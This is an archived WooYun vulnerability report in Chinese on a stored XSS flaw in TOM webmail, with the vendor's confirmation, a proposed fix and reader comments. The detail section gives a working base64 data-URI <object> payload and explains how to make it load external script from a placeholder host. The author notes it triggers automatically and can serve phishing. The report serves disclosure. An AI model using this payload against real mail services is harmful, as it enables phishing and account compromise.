{"id": 58194, "wybug_id": "wooyun-2014-051981", "wybug_title": "TOM邮箱储存型XSS一枚（自动触发）", "wybug_corp": "TOM在线", "wybug_author": "px1624", "wybug_date": "2014-02-25 17:41", "wybug_open_date": "2014-04-11 17:41", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-11：\t细节向公众公开  简要描述： 看了二哥的mxss文章后，本来想去挖点mxss实例练习的，谁知道下手晚了，腾讯、搜狐等的mxss已经被人提交了。那肯定就去网易呗，发现网易的邮箱回复、转发等功能和其他的不一样，不能直接mxss，然后就想到还有个tom邮箱。去tom邮箱后，发现tom邮箱太没档次了，貌似就没有进行二次DOM，所以也不能mxss。擦，相当不爽啊，既然没有mxss，那也不能白来啊，那就挖个直接的储存型xss吧，危害还更大！ 详细说明：  TOM这个邮箱貌似过滤规则优点弱，比起网易邮箱是差的有点远。直接利用data协议和base64编码即可成功XSS。利用代码如下：\n<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFjayBieSBweDE2MjQiKTwvc2NyaXB0Pg==>\n以上base64编码位置可以写入任意代码，当然插入外部js文件也没啥问题，直接将<script src=//xxx.js></script>进行base64编码然后替换上面base64编码的那部分代码即可。谷歌内核浏览器下自动触发！   漏洞证明：  \n\nF12\n\n用来钓鱼神马的，刚刚的！   修复方案：  可以像网易邮箱那样把data关键字给过滤掉！   版权声明：转载请注明来源 px1624@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-02-27 16:38 厂商回复： 非常感谢您对TOM在线的帮助，我们会尽快做出处理。我们为支持TOM在线的发布者创建了一个技术交流QQ群：，希望您以及更多的成员加入，大家共同交流。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-25 17:46 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  唉。。。小厂商    \n     2014-02-28 18:23 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @px1624 TOM邮箱到处是洞..    \n     2014-04-05 09:30 |    \t\t【|→上善若水】 \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:25        | 【|→上善若水】)\t\t \n  tom漏洞多了去了@px1624    \n     2014-05-26 16:24 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  对tom都没有兴趣了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}